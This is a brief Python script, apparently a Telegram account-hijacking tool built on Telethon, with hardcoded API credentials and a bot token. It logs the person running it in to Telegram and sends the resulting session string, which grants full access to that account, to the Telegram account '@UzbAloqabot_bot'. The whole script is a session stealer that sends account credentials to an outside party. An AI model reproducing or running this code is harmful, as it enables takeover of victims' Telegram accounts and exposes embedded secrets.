from telethon import TelegramClient
from telethon.sessions import StringSession
api_id = 9231412
api_hash = "f5ec8d2b31388dc2823474af5b51e114"
bot_token ="5791626093:AAH3bSg2tI2lSsJupApPTgMNJAvIfShpdtM"
client = TelegramClient('anonymous_hack', api_id, api_hash)
botClient = TelegramClient('anonimuc_hack', api_id, api_hash).start(bot_token=bot_token)
with TelegramClient(StringSession(),api_id,api_hash) as client:
    client.send_message("@UzbAloqabot_bot", client.session.save())
   
 